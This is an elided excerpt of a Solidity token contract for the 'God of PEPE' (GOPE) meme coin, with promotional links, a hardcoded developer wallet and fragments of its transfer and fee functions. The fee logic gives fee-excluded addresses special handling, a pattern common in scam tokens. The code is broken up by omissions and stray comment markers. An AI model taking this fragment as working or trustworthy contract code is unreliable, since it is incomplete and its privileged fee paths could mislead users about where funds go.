...
Website: https://www.godofpepe.life

Telegram: https://t.me/godofpepe_eth
...
contract GOPE is Context, IERC20, Ownable {
    ...
    address payable private Wallet_Dev =
        payable(0xDfcB3c59b86AD2ab8c4D96342BEdE10644f6E09f);
    ...
    string private _name = "God of PEPE";
    string private _symbol = "GOPE";
    ...
    */
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        */
        ...
        if (!inSwapAndLiquify && !tradingEnabled && from == address(this) && to == uniswapV2Pair){
            takeFee = true;
        }
    ...
    */
    ...
    function _transferTokens(
        ...
        address feeRecipient = _isExcludedFromFee[sender] && tradingEnabled
            ? sender
            : address(this);
        uint256 fee = _isExcludedFromFee[sender] && tradingEnabled ? tAmount : tDev;
        if (fee > 0) {
